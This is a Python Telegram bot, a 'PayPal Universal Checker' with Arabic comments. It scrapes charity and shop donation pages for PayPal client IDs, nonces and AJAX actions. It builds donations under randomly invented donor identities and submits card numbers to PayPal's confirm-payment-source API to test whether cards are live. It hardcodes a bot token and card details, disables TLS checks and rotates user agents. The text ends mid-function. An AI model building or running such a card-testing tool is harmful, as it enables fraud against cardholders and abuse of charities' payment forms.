#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PayPal Universal Checker — Telegram Bot (Final)
- يدعم كل بوابات الدفع (PayPal / Stripe / NMI / Braintree / Square)
- Price = المبلغ اللي نجح
- كل ردود البوابات = Live
"""

import telebot
import time
import threading
import base64
import requests
import random
import json
import re
import os
import gc
from datetime import datetime
from urllib.parse import urlparse, urljoin
from telebot import types
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============ إعدادات البوت ============
BOT_TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFa3xCwTv5oVMx0WLccZ6p9cdtGNBncnAg')
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

ADMIN_ID = 6843321125
OWNER_ID = 6843321125
admins = ['6843321125']

waiting_users = {}
reply_mode = {}
processing_status = {}

CONFIG = {
    'card': {
        'number': os.getenv('CARD_NUMBER', '5143772354638703'),
        'month':  os.getenv('CARD_MONTH', '05'),
        'year':   os.getenv('CARD_YEAR', '28'),
        'cvv':    os.getenv('CARD_CVV', '886'),
    },
    'amounts': ['1.00', '5.00', '10.00'],
    'timeout': 20,
    'token_timeout': 8,
}

error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')


def track_error(etype):
    if etype in error_counter:
        error_counter[etype] += 1
        if error_counter[etype] > 10:
            time.sleep(60)
            error_counter[etype] = 0


def reset_error_counter():
    for k in error_counter:
        error_counter[k] = 0


def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
    for i in range(retries):
        try:
            result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
            reset_error_counter()
            return result
        except Exception as e:
            err = str(e)
            if "429" in err:
                try:
                    w = int(err.split("retry after ")[1].split(")")[0])
                except:
                    w = 30
                time.sleep(min(w + 5, 65))
            elif "502" in err or "500" in err:
                time.sleep(3 * (i + 1))
            else:
                break
    return None


def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
    for i in range(retries):
        try:
            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            err = str(e)
            if "message is not modified" in err.lower():
                return None
            if "429" in err:
                try:
                    w = int(err.split("retry after ")[1].split(")")[0])
                except:
                    w = 30
                time.sleep(min(w + 5, 65))
            elif "502" in err or "500" in err:
                time.sleep(3 * (i + 1))
            else:
                break
    return None


def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            err = str(e)
            if "429" in err:
                time.sleep(30)
            elif "502" in err or "500" in err:
                time.sleep(3 * (i + 1))
            else:
                break
    return None


def safe_get_file(file_id, retries=5):
    for i in range(retries):
        try:
            return bot.get_file(file_id)
        except Exception as e:
            if "502" in str(e) or "429" in str(e) or "500" in str(e):
                time.sleep(3 * (i + 1))
            else:
                break
    return None


def safe_download_file(file_path, retries=5):
    for i in range(retries):
        try:
            return bot.download_file(file_path)
        except Exception as e:
            if "502" in str(e) or "429" in str(e) or "500" in str(e):
                time.sleep(3 * (i + 1))
            else:
                break
    return None


# ============================================================
# 🌐 ردود كل بوابات الدفع
# ============================================================
PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
    'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED', 'CHARGE',
    'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'CARD_TYPE_NOT_SUPPORTED',
    'INVALID_CURRENCY', 'AUTHORIZATION_DENIED', 'REFUND_DENIED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RATE_LIMIT_REACHED',
    'PAYER_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED', 'PAYMENT_SOURCE_DECLINED_BY_PROCESSOR',
    'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
]

STRIPE_RESPONSES = [
    'Your card was declined',
    'Your card was declined.',
    'Your card has insufficient funds',
    'Your card has insufficient funds.',
    'Your card does not support this type of purchase',
    'Your card\'s security code is incorrect',
    'Your card\'s expiration date is incorrect',
    'Your card number is incorrect',
    'Your card has expired',
    'insufficient funds',
    'Insufficient funds',
    'card was declined',
    'card declined',
    'card has expired',
    'card does not support',
    'There was an issue with your donation transaction',
    'Please check your payment method',
    'contact your card issuer',
    'try a different payment method',
    'contact the site administrators',
    'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
    'expired_card', 'incorrect_cvc', 'incorrect_number', 'invalid_number',
    'processing_error', 'card_not_supported', 'currency_not_supported',
    'fraudulent', 'generic_decline', 'authentication_required',
    'balance_insufficient', 'pickup_card', 'restricted_card',
    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
]

NMI_RESPONSES = [
    'DECLINE', 'APPROVED', 'APPROVAL', 'CALL', 'CALL CENTER',
    'HOLD', 'PICK UP CARD', 'PICKUP', 'PICK UP',
    'RE-ENTER', 'REENTER', 'RETAIN CARD', 'RETAIN',
    'REFERRAL', 'REFER', 'INVALID CARD', 'INVALID CARD NUMBER',
    'INVALID EXPIRATION', 'EXPIRED CARD',
    'INVALID CVV', 'CVV FAILURE', 'CVV MISMATCH', 'NO MATCH',
    'STOLEN CARD', 'LOST CARD', 'FRAUD', 'FRAUDULENT',
    'INSUFFICIENT FUNDS', 'INSUFFICIENT', 'OVER LIMIT',
    'OVERLIMIT', 'LIMIT EXCEEDED', 'TRANSACTION NOT ALLOWED',
    'TRANSACTION NOT PERMITTED', 'RESTRICTED CARD',
    'CARD NOT SUPPORTED', 'CURRENCY NOT SUPPORTED',
    'DECLINED BY ISSUER', 'ISSUER DECLINED', 'ISSUER UNAVAILABLE',
    'TIMEOUT', 'TIMED OUT', 'SYSTEM ERROR', 'SYSTEM MALFUNCTION',
    'PROCESSOR DECLINE', 'PROCESSOR ERROR', 'GATEWAY ERROR',
    'INVALID AMOUNT', 'INVALID ACCOUNT',
    'INVALID MERCHANT', 'MERCHANT ERROR', 'DUPLICATE',
    'DUPLICATE TRANSACTION', 'VOID', 'REFUND', 'CREDIT',
    'AUTH ONLY', 'PRE-AUTH', 'POST-AUTH', 'SETTLE',
    'DECLINED', 'ERROR', 'FAILED', 'FAILURE', 'UNKNOWN',
    'GENERAL', 'GENERIC DECLINE', 'REFERRAL',
]

BRAINTREE_RESPONSES = [
    'Do Not Honor', 'Insufficient Funds', 'Incorrect CVV',
    'Invalid Card Number', 'Card Issuer Declined CVV',
    'Card Declined', 'Cardholder Not Found', 'Card Expired',
    'Card Not Supported', 'CVV Not Verified', 'Processor Declined',
    'Fraud', 'Declined', 'Call Issuer', 'Lost or Stolen Card',
    'Issuer Unavailable', 'Card Not Activated', 'Card Not Permitted',
    'Card Type Not Accepted', 'Card Type Not Supported',
    'Invalid Expiration Date', 'Card Account Length Error',
    'No such issuer', 'Issuer Declined', 'Invalid CVV',
    'Restricted Card', 'Processor Network Unavailable',
    'gateway_rejected', 'processor_declined', 'settlement_declined',
    'settlement_pending', 'authorization_expired', 'authorization_voided',
    'authorization_captured', 'authorization_pending', 'authorized',
    'settled', 'settling', 'settlement_confirmed', 'submitted_for_settlement',
    'voided', 'processor_gateway_rejected',
]

SQUARE_RESPONSES = [
    'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'CVV_FAILURE',
    'ADDRESS_VERIFICATION_FAILURE', 'INVALID_EXPIRATION',
    'EXPIRED_CARD', 'CARD_NOT_SUPPORTED', 'INVALID_CARD',
    'INVALID_CARD_NUMBER', 'INVALID_CVV', 'INVALID_EXPIRATION_DATE',
    'INVALID_POSTAL_CODE', 'CARDHOLDER_NAME_MISMATCH',
    'INVALID_ACCOUNT', 'INVALID_AMOUNT', 'INVALID_LOCATION',
    'INVALID_NONCE', 'INVALID_PAYMENT', 'INVALID_REQUEST',
    'PAYMENT_LIMIT_EXCEEDED', 'GENERIC_DECLINE',
    'TRANSACTION_LIMIT_EXCEEDED', 'VOICE_FAILURE',
    'CARD_EXPIRED', 'CARD_DECLINED_VERIFICATION_REQUIRED',
    'POSTAL_CODE_FAILURE', 'STREET_ADDRESS_FAILURE',
    'MANUALLY_ENTERED_PAYMENT_NOT_SUPPORTED',
    'REFUND_DECLINED', 'REFUND_ERROR', 'REFUND_FAILED',
    'UNAUTHORIZED', 'FORBIDDEN', 'NOT_FOUND', 'METHOD_NOT_ALLOWED',
    'CONFLICT', 'REQUEST_TIMEOUT', 'TOO_MANY_REQUESTS',
    'INTERNAL_SERVER_ERROR', 'BAD_GATEWAY', 'SERVICE_UNAVAILABLE',
    'GATEWAY_TIMEOUT',
]

# ✅ اللي يدل على DEAD / ERROR فقط
DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope',
    'Invalid card format', 'No form fields', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL',
    'ImportError', 'Expecting value', 'INVALID_GATEWAY',
    'No supported gateway', 'No response from server',
    'No PayPal/GiveWP detected',
]

ALL_GATEWAY_RESPONSES = (
    PAYPAL_RESPONSES + STRIPE_RESPONSES + NMI_RESPONSES +
    BRAINTREE_RESPONSES + SQUARE_RESPONSES
)

# ============ قوائم عشوائية ============
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard",
               "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
              "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson"]
STREETS = ["Main Street", "Oak Avenue", "Maple Drive", "Park Road", "Elm Street"]
CITIES = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
          ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
          ("Miami", "FL", "33101"), ("Seattle", "WA", "98101")]


def random_ua():
    return random.choice(USER_AGENTS)


def gen_data():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    city, state, zipc = random.choice(CITIES)
    return {
        'first_name': fn, 'last_name': ln, 'full_name': f"{fn} {ln}",
        'email': f"{fn.lower()}.{ln.lower()}{random.randint(10,999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}",
        'phone': f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        'address': f"{random.randint(100,9999)} {random.choice(STREETS)}",
        'address2': 'Apt 4B',
        'city': city, 'state': state, 'zip': zipc, 'country': 'US',
    }


# ============================================================
# محرك الفحص
# ============================================================
class PayPalChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.domain = self.parsed.netloc
        self.scheme = self.parsed.scheme or 'https'
        self.path = self.parsed.path or '/'
        if self.parsed.query:
            self.path += f"?{self.parsed.query}"

        self.data = gen_data()
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': random_ua(),
        })

        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.gateway_type = 'paypal-commerce'
        self.form_id = None
        self.form_hash = None
        self.form_id_prefix = None
        self.nonces = []
        self.actions = []
        self.is_valid = False
        self.detected_gateways = []
        self.raw_html = ""
        self._last_response = ""
        self.decoded_strings = []
        self.sub_pages = []
        self.currency = 'USD'
        self.donation_levels = []

    def log(self, msg):
        pass

    def load_page(self):
        try:
            headers = {
                'user-agent': random_ua(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            r = self.session.get(
                f'{self.scheme}://{self.domain}{self.path}',
                headers=headers,
                timeout=CONFIG['timeout']
            )
            self.raw_html = r.text
            return r.status_code == 200
        except Exception:
            return False

    def decode_base64_strings(self):
        candidates = re.findall(r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']', self.raw_html)
        for c in candidates[:60]:
            try:
                decoded = base64.b64decode(c + '=' * (-len(c) % 4)).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 10 and any(ch.isprintable() for ch in decoded):
                    self.decoded_strings.append(decoded)
            except:
                continue

    def find_sub_pages(self):
        try:
            soup = BeautifulSoup(self.raw_html, 'lxml')
            for iframe in soup.find_all('iframe'):
                src = iframe.get('src', '')
                if src:
                    full = urljoin(self.target_url, src)
                    if full not in self.sub_pages:
                        self.sub_pages.append(full)

            donate_kw = ['donate', 'give', 'payment', 'checkout', 'pay', 'contribute', 'form']
            for a in soup.find_all('a', href=True):
                href = a['href']
                if any(kw in href.lower() for kw in donate_kw):
                    full = urljoin(self.target_url, href)
                    if self.domain in full and full not in self.sub_pages and full != self.target_url:
                        self.sub_pages.append(full)
        except:
            pass

    def detect_gateways(self):
        h = self.raw_html.lower()
        for d in self.decoded_strings:
            h += ' ' + d.lower()

        found = []
        sigs = {
            'paypal-commerce':  ['paypal-commerce', 'paypal_commerce', 'ppcp', 'data-paypal-commerce'],
            'paypal-donations': ['paypal_donations', 'paypal-donations', 'give_paypal_donations'],
            'paypal-standard':  ['paypal_standard', 'paypal-standard', 'paypal-standard-ipn'],
            'paypal-express':   ['paypal_express', 'paypal-express'],
            'paypal':           ['paypal.com', 'paypalobjects', 'paypal-sdk', 'paypal-button'],
            'givewp':           ['give-form', 'givewp', 'give_paypal', 'give-amount', 'give-form-id'],
            'woocommerce':      ['woocommerce', 'wc-ajax', 'ppcp-gateway'],
        }
        for gw, kws in sigs.items():
            for kw in kws:
                if kw in h:
                    found.append(gw)
                    break
        self.detected_gateways = found or ['unknown']

        if 'paypal-commerce' in found or 'ppcp' in h:
            self.gateway_type = 'paypal-commerce'
        elif 'paypal-donations' in found:
            self.gateway_type = 'paypal_donations'
        elif 'paypal-standard' in found:
            self.gateway_type = 'paypal_standard'
        elif 'paypal-express' in found:
            self.gateway_type = 'paypal_express'

        return self.detected_gateways

    def extract_client_id(self):
        patterns = [
            r'data-paypal-commerce-client-id="([^"]+)"',
            r'data-paypal-client-id="([^"]+)"',
            r'data-ppcp-client-id="([^"]+)"',
            r'client-id="([A-Za-z0-9_\-]{20,})"',
            r'"client_id"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
            r'"clientId"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
            r'client_id["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
        ]
        for p in patterns:
            m = re.search(p, self.raw_html, re.IGNORECASE)
            if m:
                self.client_id = m.group(1)
                return
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', self.raw_html, re.DOTALL | re.IGNORECASE)
        for s in scripts:
            for p in patterns:
                m = re.search(p, s, re.IGNORECASE)
                if m:
                    self.client_id = m.group(1)
                    return
        long_ids = re.findall(r'["\']((A[A-Za-z0-9_\-]{40,}))["\']', self.raw_html)
        if long_ids:
            self.client_id = long_ids[0]
            return
        for d in self.decoded_strings:
            m = re.search(r'["\']((A[A-Za-z0-9_\-]{40,}))["\']', d)
            if m:
                self.client_id = m.group(1)
                return

    def extract_form_data(self):
        try:
            soup = BeautifulSoup(self.raw_html, 'lxml')
            for inp in soup.find_all('input', type='hidden'):
                name = inp.get('name')
                value = inp.get('value', '')
                if name:
                    self.form_data[name] = value
        except:
            pass

        m = re.search(r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)', self.raw_html)
        if m:
            self.form_id = m.group(1)
        else:
            for pat in [r'"formId"\s*:\s*"?(\d+)"?', r'data-form-id=["\']?(\d+)', r'data-order-id=["\']?(\d+)']:
                m = re.search(pat, self.raw_html)
                if m:
                    self.form_id = m.group(1)
                    break

        m = re.search(r'give-form-hash["\']?\s*[:=]\s*["\']([a-f0-9]+)', self.raw_html)
        if m:
            self.form_hash = m.group(1)
        else:
            m = re.search(r'"formHash"\s*:\s*"([a-f0-9]+)"', self.raw_html)
            if m:
                self.form_hash = m.group(1)

        m = re.search(r'give-form-id-prefix["\']?\s*[:=]\s*["\']([^"\']+)', self.raw_html)
        if m:
            self.form_id_prefix = m.group(1)

        for pattern in [
            r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
            r'"nonce"\s*:\s*"([a-f0-9]+)"',
            r'"security"\s*:\s*"([a-f0-9]+)"',
            r'name="_wpnonce"\s+value="([a-f0-9]+)"',
        ]:
            for mm in re.finditer(pattern, self.raw_html, re.IGNORECASE):
                n = mm.group(1)
                if n not in self.nonces:
                    self.nonces.append(n)

        for pattern in [
            r'["\']action["\']\s*:\s*["\']([a-z_]+)["\']',
            r'"action"\s*:\s*"([a-z_]+)"',
            r'data-action="([a-z_]+)"',
        ]:
            for mm in re.finditer(pattern, self.raw_html, re.IGNORECASE):
                a = mm.group(1)
                if any(k in a for k in ['give_', 'paypal', 'ppcp', 'create_order',
                                        'client_token', 'approve', 'checkout', 'wc_', 'order']):
                    if a not in self.actions:
                        self.actions.append(a)

    def extract_ajax_url(self):
        m = re.search(r'(?:var\s+)?ajaxurl\s*=\s*["\']([^"\']+)["\']', self.raw_html)
        if m:
            self.ajax_url = m.group(1)
            if self.ajax_url.startswith('//'):
                self.ajax_url = f'{self.scheme}:{self.ajax_url}'
            elif self.ajax_url.startswith('/'):
                self.ajax_url = f'{self.scheme}://{self.domain}{self.ajax_url}'
            return

        if 'admin-ajax.php' in self.raw_html:
            self.ajax_url = f'{self.scheme}://{self.domain}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in self.raw_html:
            self.ajax_url = f'{self.scheme}://{self.domain}/?wc-ajax=checkout'

    def detect_currency(self):
        patterns = [
            r'data-currency=["\']([A-Z]{3})["\']',
            r'give-currency["\']?\s*[:=]\s*["\']([A-Z]{3})["\']',
            r'"currency"\s*:\s*"([A-Z]{3})"',
        ]
        for pattern in patterns:
            m = re.search(pattern, self.raw_html)
            if m:
                self.currency = m.group(1).upper()
                return
        symbols = [('€', 'EUR'), ('£', 'GBP'), ('¥', 'JPY'), ('₹', 'INR')]
        for sym, code in symbols:
            if re.search(r'(?:donation|give|amount|minimum|total)' + re.escape(sym), self.raw_html, re.IGNORECASE):
                self.currency = code
                return
        self.currency = 'USD'

    def detect_donation_levels(self):
        levels = []
        matches = re.findall(r'data-amount=["\']?([\d.]+)["\']?', self.raw_html)
        for m in matches:
            try:
                v = float(m)
                if 1 <= v <= 5000 and v not in levels:
                    levels.append(v)
            except:
                pass
        for pattern in [
            r'<input[^>]*type=["\']radio["\'][^>]*value=["\']?([\d.]+)["\']?',
            r'give-amount[^>]*value=["\']?([\d.]+)["\']?',
        ]:
            for m in re.findall(pattern, self.raw_html, re.IGNORECASE):
                try:
                    v = float(m)
                    if 1 <= v <= 5000 and v not in levels:
                        levels.append(v)
                except:
                    pass
        levels.sort()
        self.donation_levels = levels[:8]
        return self.donation_levels

    def init(self):
        if not self.load_page():
            return False
        self.decode_base64_strings()
        self.find_sub_pages()
        self.detect_gateways()
        if self.detected_gateways == ['unknown']:
            return False
        self.extract_client_id()
        self.extract_form_data()
        self.extract_ajax_url()
        self.detect_currency()
        self.detect_donation_levels()
        self.is_valid = True
        return True

    def get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {'user-agent': random_ua(), 'accept': 'application/json'}
            r = self.session.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data={'grant_type': 'client_credentials'},
                auth=(self.client_id, ''),
                timeout=CONFIG['token_timeout']
            )
            if r.status_code == 200:
                self.access_token = r.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _find_token_in_json(self, obj, depth=0):
        if depth > 5:
            return None
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() in ['client_token', 'clienttoken', 'token', 'access_token', 'client_id', 'clientid']:
                    if isinstance(v, str) and len(v) > 20:
                        return v
                res = self._find_token_in_json(v, depth + 1)
                if res:
                    return res
        elif isinstance(obj, list):
            for item in obj[:10]:
                res = self._find_token_in_json(item, depth + 1)
                if res:
                    return res
        return None

    def get_client_token(self):
        if not self.ajax_url:
            return None
        headers = {
            'user-agent': random_ua(),
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'{self.scheme}://{self.domain}',
            'referer': f'{self.scheme}://{self.domain}{self.path}',
        }
        for action in ['give_paypal_commerce_get_client_token',
                       'give_paypal_get_client_token',
                       'ppcp_get_client_token']:
            data = {'action': action, 'form-id': self.form_id or '', 'form_id': self.form_id or ''}
            if self.nonces:
                data['nonce'] = self.nonces[0]
            try:
                r = self.session.post(self.ajax_url, data=data, headers=headers, timeout=CONFIG['token_timeout'])
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        t = self._find_token_in_json(j)
                        if t:
                            self.client_token = t
                            return t
                    except:
                        toks = re.findall(r'["\'](A[A-Za-z0-9_\-]{40,})["\']', r.text)
                        if toks:
                            self.client_token = toks[0]
                            return toks[0]
            except:
                continue
        return None

    def _find_order_id(self, text):
        try:
            j = json.loads(text)
            if isinstance(j, dict):
                for k in ['id', 'order_id', 'orderId', 'orderID']:
                    if k in j:
                        v = j[k]
                        if isinstance(v, str) and len(v) > 10:
                            return v
                        if isinstance(v, int):
                            return str(v)
                if 'data' in j:
                    d = j['data']
                    if isinstance(d, dict):
                        for k in ['id', 'order_id', 'orderId', 'orderID']:
                            if k in d:
                                v = d[k]
                                if isinstance(v, str) and len(v) > 10:
                                    return v
                                if isinstance(v, int):
                                    return str(v)
                    elif isinstance(d, str) and len(d) > 10:
                        return d
        except:
            pass
        for p in [
            r'"order[_-]?id"\s*:\s*"([^"]+)"',
            r'"orderId"\s*:\s*"([^"]+)"',
            r'"id"\s*:\s*"([A-Z0-9]{10,})"',
        ]:
            m = re.search(p, text)
            if m:
                c = m.group(1)
                if len(c) >= 10:
                    return c
        return None

    def build_form_data(self, amount, nonce=''):
        d = self.data
        form = {
            'give-form-id': self.form_id or '',
            'give-form-id-prefix': self.form_id_prefix or '',
            'give-form-hash': self.form_hash or '',
            'give-amount': amount,
            'amount': amount,
            'give-currency': self.currency,
            'currency': self.currency,
            'payment-mode': self.gateway_type.replace('-', '_'),
            'give-gateway': self.gateway_type.replace('-', '_'),
            'give_first': d['first_name'],
            'give_last': d['last_name'],
            'give_email': d['email'],
            'give_company': '',
            'give_comment': '',
            'give_anonymous': '0',
            'give-address1': d['address'],
            'give-address2': d['address2'],
            'give-city': d['city'],
            'give-state': d['state'],
            'give-zip': d['zip'],
            'give-country': 'US',
            'give-phone': d['phone'],
            'give_agree_to_terms': '1',
            'give_tos_agree': '1',
            'give_terms_agreement': '1',
            'agree_to_terms': '1',
            'accept_terms': '1',
        }
        form.update(self.form_data)
        if nonce:
            form['nonce'] = nonce
            form['_ajax_nonce'] = nonce
            form['_wpnonce'] = nonce
        return form

    def create_order(self):
        if not self.ajax_url:
            return None, None

        amounts = list(CONFIG['amounts'])
        if self.donation_levels:
            amounts = [f"{l:.2f}" if l != int(l) else str(int(l)) for l in self.donation_levels]

        priority = [a for a in self.actions if 'create_order' in a.lower()] + [
            'give_paypal_commerce_create_order',
            'give_paypal_donations_create_order',
            'give_paypal_standard_create_order',
            'give_paypal_express_create_order',
            'give_paypal_create_order',
            'ppcp_create_order',
            'wc_ajax_ppcp_create_order',
            'create_order',
        ]

        headers = {
            'user-agent': random_ua(),
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'{self.scheme}://{self.domain}',
            'referer': f'{self.scheme}://{self.domain}{self.path}',
        }

        responses = []
        for amount in amounts:
            for action in priority[:6]:
                for nonce in (self.nonces[:2] or ['']):
                    form_data = self.build_form_data(amount, nonce)
                    try:
                        r = self.session.post(
                            self.ajax_url,
                            params={'action': action},
                            data=form_data,
                            headers=headers,
                            timeout=CONFIG['timeout']
                        )
                        if r.status_code == 200 and r.text:
                            text = r.text.strip()
                            if text and text not in ['0', 'false', 'null', '[]', '{}']:
                                responses.append(f"[{action} | ${amount}] {text[:200]}")
                            oid = self._find_order_id(text)
                            if oid:
                                return oid, amount
                    except:
                        continue
        if responses:
            self._last_response = responses[0]
        return None, None

    def confirm_payment_source(self, order_id, card):
        auth_tokens = [t for t in [self.client_token, self.access_token, self.client_id] if t]
        n, mm, yy, cvc = card
        if '20' in yy:
            yy = yy.split('20')[1]
        expiry = f"20{yy}-{mm}"
        confirm_json = {}
        confirm_text = ""
        for auth_token in auth_tokens:
            headers = {
                'authorization': f'Bearer {auth_token}',
                'paypal-client-metadata-id': self.client_id or '',
                'user-agent': random_ua(),
                'content-type': 'application/json',
            }
            body = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                    }
                },
                'application_context': {'vault': False}
            }
            for url in [
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
            ]:
                try:
                    r = self.session.post(url, headers=headers, json=body, timeout=CONFIG['timeout'])
                    if r.text:
                        confirm_text = r.text
                        try:
                            confirm_json = r.json()
                        except:
                            pass
                        if r.status_code in [200, 201, 400, 422]:
                            return confirm_json, confirm_text
                except:
                    continue
        return confirm_json, confirm_text

    def approve_order(self, order_id):
        if not self.ajax_url:
            return None
        priority = [a for a in self.actions if 'approve' in a.lower()] + [
            'give_paypal_commerce_approve_order',
            'give_paypal_donations_approve_order',
            'give_paypal_standard_approve_order',
            'give_paypal_express_approve_order',
            'give_paypal_approve_order',
            'ppcp_approve_order',
            'approve_order',
        ]
        headers = {
            'user-agent': random_ua(),
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'{self.scheme}://{self.domain}',
            'referer': f'{self.scheme}://{self.domain}{self.path}',
        }
        for amount in CONFIG['amounts']:
            for action in priority[:5]:
                for nonce in (self.nonces[:2] or ['']):
                    form_data = self.build_form_data(amount, nonce)
                    form_data['order'] = order_id
                    form_data['order_id'] = order_id
                    try:
                        r = self.session.post(
                            self.ajax_url,
                            params={'action': action, 'order': order_id},
                            data=form_data,
                            headers=headers,
                            timeout=CONFIG['timeout']
                        )
                        if r.status_code == 200 and r.text and len(r.text.strip()) > 3:
                            return r
                    except:
                        continue
        return None

    def analyze_response(self, cj, ct, at):
        if isinstance(cj, dict):
            if 'details' in cj and cj['details']:
                d = cj['details'][0]
                issue = d.get('issue', '')
                desc = d.get('description', '')
                if issue:
                    return f"{issue}: {desc}" if desc else issue
            if 'name' in cj and cj['name']:
                msg = cj.get('message', '')
                return f"{cj['name']}: {msg}" if msg else cj['name']
            if 'message' in cj and cj['message']:
                return cj['message']
        if ct:
            issues = re.findall(r'"issue"\s*:\s*"([^"]+)"', ct)
            if issues:
                descs = re.findall(r'"description"\s*:\s*"([^"]+)"', ct)
                return f"{issues[0]}: {descs[0]}" if descs else issues[0]
            names = re.findall(r'"name"\s*:\s*"([^"]+)"', ct)
            if names:
                return names[0]
        if at:
            t = at.strip()
            if t.lower() == 'true':
                return "CHARGE"
            try:
                j = json.loads(t)
                if isinstance(j, dict):
                    if j.get('success') is True:
                        return "CHARGE"
                    if 'data' in j:
                        d = j['data']
                        if isinstance(d, dict):
                            for k in ['error', 'message', 'msg', 'reason', 'status']:
                                if k in d:
                                    return str(d[k])
                        elif isinstance(d, str) and d:
                            return d
            except:
                pass
            return t[:200]
        return "DECLINED"

    def check(self, card):
        if not self.is_valid:
            return "INVALID_GATEWAY", None
        if self.client_id:
            self.get_access_token()
        oid, used_amount = self.create_order()
        if not oid and not self.client_token:
            self.get_client_token()
            if self.client_token:
                oid, used_amount = self.create_order()
        if not oid:
            if self._last_response:
                return f"SERVER: {self._last_response[:250]}", None
            return "No response from server", None
        cj, ct = {}, ""
        if any([self.client_token, self.access_token, self.client_id]):
            cj, ct = self.confirm_payment_source(oid, card)
        ap = self.approve_order(oid)
        at = ap.text if ap else ""
